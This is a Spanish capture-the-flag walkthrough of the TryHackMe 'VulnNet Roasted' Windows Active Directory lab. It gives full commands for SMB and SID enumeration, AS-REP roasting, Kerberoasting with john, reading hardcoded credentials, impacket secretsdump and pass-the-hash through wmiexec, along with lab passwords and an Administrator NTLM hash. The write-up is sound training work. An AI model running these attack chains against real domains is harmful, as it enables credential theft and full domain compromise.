# ⚔️ VulNet — Roasted (TryHackMe)

## 🧩 Introducción

VulnNet Entertainment acaba de implementar una nueva instancia en su red con los administradores de sistemas recién contratados. Como empresa comprometida con la seguridad, te contrataron, como siempre, para realizar una prueba de penetración y evaluar el desempeño de los administradores de sistemas.

* 🧠 **Dificultad:** Fácil
* 💻 **Sistema operativo:** Windows

---

## 🔹 Paso 1 — Ping

**🎯 Objetivo:** Comprobar la conectividad con la máquina objetivo y verificar los tiempos de respuesta.

**🧰 Comando utilizado:**

```bash
ping -c 4 10.10.247.84
```

**📋 Descripción del resultado:**

* Se enviaron 4 paquetes ICMP y se recibieron 4 respuestas: `4 packets transmitted, 4 received, 0% packet loss` — esto indica que la máquina objetivo responde correctamente al ping.
* Los tiempos de ida y vuelta (rtt) aparecen indicados como `min/avg/max/mdev`, lo que nos da una idea de la latencia entre nuestra máquina y la máquina objetivo.

**🔍 Interpretación:**

La máquina `10.10.247.84` está activa y accesible desde la red. No hay pérdida de paquetes y la latencia es razonable (≈50 ms promedio), por lo que podemos avanzar con las fases de reconocimiento y enumeración.

**🖼️ Evidencia:**

<img width="681" height="290" alt="Ping" src="https://github.com/user-attachments/assets/984ebdff-b4f2-4f19-81ed-f4a12d368205" />

---

## 🔹 Paso 2 — Escaneo con Nmap

**🎯 Objetivo:** Realizar un reconocimiento profundo de puertos y servicios activos para identificar posibles vectores de ataque.

**🧰 Comando utilizado (ejemplo):**

```bash
nmap -p- -sV -sC --open --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.247.84
```

> Nota: el comando real usado en la captura incluye opciones para detección de versión (`-sV`), scripts (`-sC`), omitir ping (`-Pn`), alta velocidad de envío (`--min-rate 5000`) y salida detallada.

**📋 Resumen de resultados importantes:**

* **Host:** `10.10.247.84` — `Host is up`.
* **Nombre del host y SO detectado:** `WIN-2B08M10E1M1`, **OS:** Windows.
* **Dominio detectado (Active Directory / LDAP):** `vulnnet-rst.local.`

**Puertos y servicios relevantes encontrados:**

* `53/tcp` — **DNS (Simple DNS Plus)** 🧭
* `88/tcp` — **Kerberos** (Microsoft Windows Kerberos) 🔐
* `135/tcp` — **msrpc** (RPC) ⚙️
* `139/tcp` — **netbios-ssn** 🗂️
* `389/tcp` y `3268/tcp` — **LDAP / Active Directory** 🧾 (Domain: `vulnnet-rst.local.`)
* `445/tcp` — **microsoft-ds (SMB)** 📁
* `593/tcp`, `49670/tcp` — **ncacn_http / RPC over HTTP** 🌐
* `5985/tcp` — **http (WinRM / HTTPAPI)** 🔧
* Muchos puertos `msrpc` de alto rango (49666–49826, etc.) — servicios RPC remotos.

**Host script results (destacados):**

* `smb2-security-mode`: `Message signing enabled and required` — ✉️ SMB message signing está habilitado y obligatorio (implicaciones: dificulta ataques de falsificación (SMB relay) si no se encuentra una configuración débil que permita bypass).
* `p2p-conficker`: checks clean — la máquina no parece vulnerable a Conficker según los checks del script.

**🔍 Interpretación y posibles opciones a seguir:**

1. La presencia de **LDAP** y un dominio Active Directory (`vulnnet-rst.local`) indica que la máquina forma parte de un dominio — debemos centrar la enumeración en servicios de directorio y credenciales (LDAP, Kerberos, SMB, RPC, WinRM).
2. **SMB (445)** está abierto y `smb2` requiere firma. Aun así, probar enumeración SMB/AD (shares, usuarios, enum de usuarios a través de LDAP/SMB) es obligatorio. Herramientas como `smbclient`, `rpcclient`, `enum4linux`, `crackmapexec` y `impacket` serán útiles.
3. **Kerberos (88)** sugiere que vale la pena explorar técnicas basadas en Kerberos: SPN enumeration (`setspn`/impacket), AS-REP roasting (si existen usuarios sin preauth), y posibles ataques relayed/kerberoasting dependiendo de configuraciones.
4. **WinRM (5985)** y servicios RPC sugieren vectores para ejecución remota si conseguimos credenciales válidas.

**🖼️ Evidencia:**

<img width="1426" height="887" alt="nmap" src="https://github.com/user-attachments/assets/2e1f75f6-0c44-4939-8def-8c85a7e85e27" />

---
## 🔹 Paso 3 — Agrego dominio, enumero recursos SMB y descargo ficheros

**🎯 Objetivo:** Añadir resolución del dominio al `hosts`, enumerar recursos SMB accesibles como invitado y descargar información interesante encontrada en los shares.

**🧰 Comandos / acciones realizadas:**

1. Añadir la entrada en `/etc/hosts` para resolver el dominio del Active Directory local desde nuestra máquina:

```text
# /etc/hosts
10.10.247.84 vulnnet-rst.local
````
2. Enumerar recursos compartidos con smbmap como usuario anónimo (guest):

````bash
smbmap -u 'null' -H 10.10.247.84
````
3.Conectar a los shares públicos con smbclient (sin credenciales) y listar/descargar archivos:

````bash
smbclient //10.10.247.84/VulnNet-Business-Anonymous -N
smb:> dir
smb:> get Business-Manager.txt
smb:> get Business-Sections.txt
smb:> get Business-Tracking.txt
smb:> exit

smbclient //10.10.247.84/VulnNet-Enterprise-Anonymous -N
smb:> dir
smb:> get Enterprise-Operations.txt
smb:> get Enterprise-Safety.txt
smb:> get Enterprise-Sync.txt
smb:> exit
````

📋 Resultados clave:

smbmap informó que existe una sesión de Guest contra 10.10.247.84:445 y detectó varios shares, entre ellos: VulnNet-Business-Anonymous y VulnNet-Enterprise-Anonymous con permisos READ ONLY.

Con smbclient conseguí acceder a ambos shares anónimamente (-N) y descargué varios ficheros de texto que parecen contener información de negocio y operaciones (posibles fuentes de información útil para enumeración de usuarios, procesos internos o credenciales débiles en otros pasos).

Registrar el dominio en /etc/hosts como vulnnet-rst.local facilita consultas LDAP/HTTP dirigidas al nombre del dominio y evita problemas de resolución en herramientas que trabajan con FQDNs.

🔍 Interpretación y siguientes pasos sugeridos:

Los ficheros descargados (Business-Manager.txt, Business-Sections.txt, Enterprise-Operations.txt, etc.) deben revisarse en busca de nombres de usuarios, correos, rutas o cualquier pista que permita avanzar en enumeración de cuentas o en ataques de Kerberos/AD.

Tener shares accesibles como anónimo indica cierta laxitud en permisos: aunque sean read-only, pueden filtrar información sensible. Buscar en los ficheros pistas para ataques de kerberoasting, AS-REP roasting o para encontrar nombres de servicio (SPNs) y cuentas de interés.

Con el dominio en hosts, se podrá usar ldapsearch, rpcclient, crackmapexec o impacket apuntando a vulnnet-rst.local para extraer más información de Active Directory.

🖼️ Evidencia:

Resultado de enumeración SMB (smbmap) y lista de shares.

<img width="1040" height="306" alt="enumero recursos compartidos smbmap" src="https://github.com/user-attachments/assets/447cb6b2-2af5-4b8b-a7f0-ab7e44764025" />

Conexión a los shares y descarga de ficheros con smbclient.

<img width="953" height="934" alt="entro a los recursos y me descrago ficheros" src="https://github.com/user-attachments/assets/37cdba18-3c5c-47bf-8b79-8b72919280e0" />

Modificación de /etc/hosts añadiendo vulnnet-rst.local.

<img width="878" height="280" alt="agrego dominio a etc hosts" src="https://github.com/user-attachments/assets/6e5e19eb-0f14-4a7a-b5e9-2f526b1344cf" />

---

## 🔹 Paso 4 — Organizo los ficheros descargados y extraigo posibles usuarios

**🎯 Objetivo:** Crear un directorio para centralizar los documentos SMB descargados, revisarlos y extraer posibles nombres de usuarios que puedan servir para enumeración/ataques posteriores.

**🧰 Comandos / acciones realizadas:**

```bash
# Creo un directorio para los documentos descargados
mkdir documentos_smb
# Muevo todos los .txt al directorio
mv *.txt documentos_smb/
# Entro en el directorio y listado
cd documentos_smb
ls
# Visualizo el contenido de los archivos
cat *
````
📋 Resultado / evidencia:

Dentro de documentos_smb tengo los archivos:

Business-Manager.txt

Business-Sections.txt

Business-Tracking.txt

Enterprise-Operations.txt

Enterprise-Safety.txt

Enterprise-Sync.txt

Al leer los ficheros aparecen nombres y referencias que podrían corresponder a usuarios o personas de interés. De los textos extraigo estos candidatos a usuarios:
````nginx
Alexa
Jack
Johnny
Tony5
````
(guardé la lista en un archivo users para usarla en fases posteriores).

🔍 Interpretación y siguientes pasos sugeridos:

Estos nombres serán útiles como lista de usuarios para pruebas de enumeración/autenticación (ej.: intentos de inicio de sesión, ataques de Kerberos/AS-REP, bruteforce, o uso con crackmapexec/kerbrute/impacket).

Conviene normalizar y ampliar la lista (ej. agregar variantes: alexa.whitehat, jack.goldenhand, johnny, tony) antes de usarla en ataques dirigidos.

Revisar los ficheros con más detalle buscando correos, cargos, SPNs o referencias a servicios que permitan orientar ataques (por ejemplo Business-Manager → buscar username/email asociado).

🖼️ Evidencia rápida:

Organización de los ficheros en documentos_smb y vista de su contenido.

<img width="878" height="957" alt="me creo una carpeta y guardo todos los feciheros para leerlos" src="https://github.com/user-attachments/assets/31b53cad-58e2-4f96-8175-83b2a1b6d7e4" />

Archivo users con los nombres extraídos.

<img width="331" height="317" alt="me creo un archivo users con posibles usuarios" src="https://github.com/user-attachments/assets/6eb25a5c-1802-4c78-91b8-389937565325" />

---

## 🔹 Paso 5 — Enumeración de SIDs / extracción de usuarios con Impacket y limpieza

**🎯 Objetivo:** Enumerar SIDs/entradas del dominio con `impacket-lookupsid`, extraer los nombres de usuario/grupo y limpiar la salida para obtener una lista usable para fases posteriores (kerberoasting, bruteforce, pruebas de credenciales, etc.).

**🧰 Comandos / acciones realizadas:**

1. Ejecutar `impacket-lookupsid` contra el host (salida guardada en un fichero):

```bash
impacket-lookupsid guest@10.10.247.84 -no-pass >> usuarios_impacket
````
2.Extraer sólo los nombres (una forma robusta y sencilla usando grep + sed + sort):
````bash
# Extrae las cadenas que siguen a 'VULNNET-RST\' y quita el caracter final '$' si existe
grep -oP 'VULNNET-RST\\\\\K[^ )]+' usuarios_impacket | sed 's/\$$//' | sort -u > usuarios_impacket_clean
````
Explicación rápida:

grep -oP 'VULNNET-RST\\\\\K[^ )]+' busca las ocurrencias del prefijo VULNNET-RST\ y captura el texto que viene después hasta un espacio o paréntesis.

sed 's/\$$//' elimina el sufijo $ de cuentas de equipo (WIN-...$).

sort -u deja la lista única y ordenada.

📋 Resultado / evidencia:

Fichero original con la salida de impacket-lookupsid: usuarios_impacket

<img width="896" height="821" alt="utilizo impacket para listar usuarios" src="https://github.com/user-attachments/assets/aa7ee4ab-b11a-468d-af44-8325541810f2" />

Fichero final limpio con usuarios/entradas procesadas: usuarios_impacket_clean

<img width="891" height="699" alt="utilizo regex para limpiar los usuarios y los guardo en un arhcivo" src="https://github.com/user-attachments/assets/7364439c-7835-4b9c-9633-f2b3d7c7f686" />

🔍 Interpretación y siguientes pasos sugeridos:

La lista usuarios_impacket_clean es muy útil como userlist para:

Pruebas AS-REP roasting / Kerberoasting (buscar cuentas sin preauth o SPNs).

Ataques de fuerza bruta (si procede) o pruebas de credenciales con crackmapexec, kerbrute, hydra, etc.

Enumeración dirigida con crackmapexec smb / rpcclient / impacket apuntando a usuarios concretos.

Filtrar la lista para separar cuentas de servicio (a-whitehat, j-goldenhand, etc.) de grupos y máquinas (WIN-...$), ya que las cuentas de servicio suelen ser buenos objetivos para kerberoast.

---

## 🔹 Paso 6 — AS-REP Roasting: extraigo hash con Impacket y lo descifro con John

**🎯 Objetivo:** Aprovechar cuentas sin `UF_DONT_REQUIRE_PREAUTH` (AS-REP roasting) para extraer hashes Kerberos (krb5asrep) y crackearlos offline con `john` para obtener credenciales válidas.

**🧰 Comandos / acciones realizadas:**

1. Ejecutar `GetNPUsers` de Impacket usando la `userlist` (fichero `users`) y sin contraseña para solicitar TGS de cuentas que no requieren preauth:

```bash
impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile users > asrep_output.txt
````
En la salida aparecen líneas tipo krb5asrep$23$...$usuario@DOMINIO para las cuentas vulnerables (ej. t-skid).

2. Extraer el hash (krb5asrep$...) a un fichero hash para pasar a John:
````bash
# (ejemplo simple: filtrar las líneas que contienen 'krb5asrep' y guardarlas)
grep 'krb5asrep' asrep_output.txt > hash
````
3.Ejecutar John con un wordlist (p. ej. rockyou.txt) para crackear el hash:
````bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
````
4. (Opcional) Ver la/s contraseñas recuperadas:
````bash
john --show hash
````
📋 Resultado / evidencia:

impacket-GetNPUsers encontró al menos una cuenta sin preauth y volcó el hash krb5asrep$... (capturado en asrep_output.txt).

<img width="949" height="461" alt="utilizo impacket sobre el archivo para fuerza bruta" src="https://github.com/user-attachments/assets/7ad92a72-bc79-4cec-9b51-44b52de9029b" />

john procesó el hash con rockyou.txt y completó la sesión de cracking. Para mostrar la contraseña recuperada se puede usar john --show hash.

<img width="943" height="258" alt="uso john para descifrar hash" src="https://github.com/user-attachments/assets/3c9d71fb-06be-411a-8bf0-a6b8b81f6245" />

🔍 Interpretación y siguientes pasos sugeridos:

Si john --show hash devuelve una contraseña (por ejemplo, para el usuario t-skid), esa credencial es válida contra el dominio y puede usarse para:

Probar crackmapexec / smbclient / evil-winrm contra el host o contra otros hosts del dominio.

Intentar escalado lateral o acceso a servicios como WinRM/SMB/RPC con t-skid@vulnnet-rst.local.

---

## 🔹 Paso 7 — Kerberoasting: solicito SPNs con Impacket, extraigo hash TGS y lo descifro con John

**🎯 Objetivo:** Enumerar Service Principal Names (SPNs) para la cuenta objetivo, solicitar los TGS (kerberoastable) con `impacket-GetUserSPNs` y crackear los hashes offline con `john` para obtener credenciales de servicio.

**🧰 Comandos / acciones realizadas:**

1. Pedir los SPNs y solicitar el ticket (TGS) para el usuario objetivo (`t-skid` en este caso), redirigiendo la salida a un fichero:

```bash
impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -request > getspns_output.txt
````
Nota: la opción -request pide los TGS directamente y en la salida aparecen líneas con formato krb5tgs$...$SPN@DOMINIO (hashs TGS listos para crackear).

2. Extraer sólo los hashes TGS del fichero a uno nuevo (hash2):
````bash
grep 'krb5tgs' getspns_output.txt > hash2
````
3. Crackear los hashes con john usando una wordlist (p. ej. rockyou.txt):
````bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash2
````
4. Mostrar la/s credenciales recuperadas:
````bash
john --show hash2
````
📋 Resultados / evidencia:

impacket-GetUserSPNs devolvió hashes TGS (krb5tgs...) para cuentas con SPNs.

<img width="943" height="729" alt="utilizo impacket para obter ticket y hash" src="https://github.com/user-attachments/assets/a38758a0-788d-4265-ae77-e483c6a2d99d" />

john crackeó el hash (hash2) usando rockyou.txt y obtuvo la contraseña correspondiente (ver salida de john).

<img width="943" height="199" alt="utilizando john descifro el hash 2" src="https://github.com/user-attachments/assets/21664dbc-d27c-4754-aab4-169f3ac503b0" />

🔍 Interpretación y siguientes pasos sugeridos:

La contraseña obtenida pertenece a una cuenta de servicio (o usuario con SPN). Con esas credenciales puedes:

Probar acceso a servicios como evil-winrm, smbclient, crackmapexec o wmiexec para obtener acceso remoto o ejecución de comandos.

Intentar movimiento lateral hacia otros hosts del dominio o extracción adicional de información (creds, tickets, etc.).

---

## 🔹 Paso 8 — Acceso a NETLOGON con credenciales obtenidas y extracción de credenciales adicionales

**🎯 Objetivo:** Probar las credenciales ya obtenidas contra SMB, enumerar shares con ese usuario, acceder al share `NETLOGON`, descargar `ResetPassword.vbs` y extraer credenciales embebidas.

**🧰 Comandos / acciones realizadas:**

1. Probar acceso y enumerar recursos con el usuario/contraseña recuperados:

```bash
# Ejemplo usando smbclient (se solicita la contraseña)
smbclient -U 'VULNNET-RST.LOCAL/enterprise-core-vn' //10.10.74.60/NETLOGON
# o con smbmap para ver permisos sobre los shares
smbmap -H 10.10.74.60 -u 'enterprise-core-vn' -p 'ry=ibfkv, s6h,'
````
2. Conectar al share NETLOGON y descargar el fichero:
````bash
smbclient //10.10.74.60/NETLOGON -U 'VULNNET-RST.LOCAL/enterprise-core-vn'
smb:> dir
smb:> get ResetPassword.vbs
smb:> exit
````
📋 Resultados clave / Evidencia:

Con las credenciales del usuario enterprise-core-vn se pudo enumerar el host y el share NETLOGON. (Captura: enumeración con smbmap usando el usuario).

<img width="949" height="358" alt="enumero recuros con el usuario enterprise" src="https://github.com/user-attachments/assets/8a705f49-ca41-4aa7-8516-115ece0b4383" />

Dentro de NETLOGON se descargó ResetPassword.vbs. (Captura: conexión y descarga con smbclient y fichero obtenido).

<img width="952" height="271" alt="entro al recuros NETLOGON y descargo el fichero" src="https://github.com/user-attachments/assets/3e4c52cb-101b-4453-a024-a1d860df0502" />

Al leer ResetPassword.vbs se encontró credencial hardcodeada dentro del script:

strUserNTName = "a-whitehat"

strPassword = "bNdKVkvjv3RR9ht"

(Captura: contenido del script mostrando strUserNTName y strPassword).

<img width="836" height="903" alt="leo archivo descargado y obtengo nuevo usuario y pass" src="https://github.com/user-attachments/assets/bf7a3469-f44d-4fbf-bad2-938303e88ac7" />

🔍 Interpretación y siguientes pasos sugeridos:

El script ResetPassword.vbs contiene credenciales en claro para la cuenta a-whitehat. Esto es información sensible y un vector directo para autenticarse como a-whitehat en el dominio/host.

Con a-whitehat:bNdKVkvjv3RR9ht deberías:

Probar acceso remoto: evil-winrm, wmiexec.py, crackmapexec, smbclient contra la máquina objetivo y otros hosts del dominio.

Re-evaluar permisos sobre shares, ejecutar enumeración AD adicional (ldapsearch, bloodhound, rpcclient) y comprobar si a-whitehat tiene privilegios que permitan escalado lateral o elevación.

---

## 🔹 Paso 9 — Obtengo acceso privilegiado: uso `secretsdump` (Impacket), consigo hash de Administrator y recupero las flags 🏁

**🎯 Objetivo:** Escalar a privilegios administrativos extrayendo hashes locales/NTDS con `impacket-secretsdump`, usar el hash de `Administrator` con `impacket-wmiexec` para una shell privilegiada y leer las flags (`user.txt` y `system.txt`).

---

### 🔧 Comandos / acciones realizadas

1. **Dump de credenciales / SAM con `secretsdump` usando la cuenta local/credencial que teníamos (`a-whitehat`)**:

```bash
# Volcando SAM/LSA/NTDS y credenciales locales con la cuenta a-whitehat
impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkvjv3RR9ht@10.10.74.60
````
Resultado esperado: secretsdump arranca RemoteRegistry (si es necesario), vuelca hashes SAM locales y cached domain credentials. En la salida encontrarás líneas con el formato Administrator:500:<NTLM_hash>:... (NTLM hash del Administrador).

2. Uso del NTLM hash de Administrator para ejecutar un shell privilegiado mediante wmiexec (autenticación por hash / pass-the-hash):
````bash
# Con el hash obtenido (ej: aad3b435...:c2597...) ejecutar wmiexec:
impacket-wmiexec vulnnet-rst.local/Administrator@10.10.74.60 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
````
wmiexec abre una semi-interactive shell con privilegios del usuario objetivo (Administrator en este caso).

3. Listar y leer ficheros de interés (flags):
````text
# Dentro de la shell:
C:\> dir C:\Users\administrator\Desktop
C:\> type C:\Users\administrator\Desktop\system.txt    # flag SYSTEM (privileged)
C:\> cd C:\Users\enterprise-core-vn\Desktop
C:\> type user.txt                                      # flag USER (ejemplo)
````
✅ Resultados / Evidencia

impacket-secretsdump devolvió el hash de Administrator en la salida; se guardó/identificó la línea Administrator:500:<hash> y otros hashes útiles.

<img width="875" height="943" alt="utilizo impacket con secretdump" src="https://github.com/user-attachments/assets/c2244534-271e-43c7-ab43-f27f74777948" />

Con el hash de Administrator utilicé impacket-wmiexec y obtuve shell interactiva en C:\> (privilegios elevados).

<img width="948" height="495" alt="obtengo acceso a adminstrador" src="https://github.com/user-attachments/assets/a7e80281-388e-4aa1-b986-7c56c144bfd6" />

Desde la shell privilegiada leí la flag del sistema (ej. system.txt) y la del usuario (ej. user.txt) en los escritorios correspondientes:

Flag (System): THM{...} (leída desde C:\Users\Administrator\Desktop\system.txt).

<img width="863" height="801" alt="obtengo flag admin" src="https://github.com/user-attachments/assets/b086eb7b-55d4-4396-a8bd-3c9a69849b1f" />

Flag (User): THM{...} (leída desde C:\Users\enterprise-core-vn\Desktop\user.txt).

<img width="727" height="381" alt="flag user" src="https://github.com/user-attachments/assets/2dd98e75-9e7f-4ad8-ad67-497717df75fc" />

---



